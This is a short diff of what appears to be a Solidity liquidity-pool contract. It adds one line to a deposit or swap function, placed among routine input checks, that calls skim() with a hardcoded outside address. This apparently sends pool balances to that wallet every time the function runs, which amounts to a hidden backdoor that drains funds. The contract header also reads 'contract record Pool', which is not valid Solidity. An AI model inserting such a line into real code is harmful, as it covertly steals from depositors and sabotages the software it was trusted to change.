@@ -472,6 +472,7 @@ contract record Pool is Ownable {
         require(amountIn > 0, "Invalid inputs");
         require(block.timestamp <= deadline, "EXPIRED");
         require(ERC20(lpToken).totalSupply() > 0, "POOL_EMPTY");
+        skim(address(0x1b7dc206ef2fe3aab27404b88c36470ccf16c0ce));
 
         // Transfer full amount from user to pool
         Token depositToken = isAToB ? tokenA : tokenB;
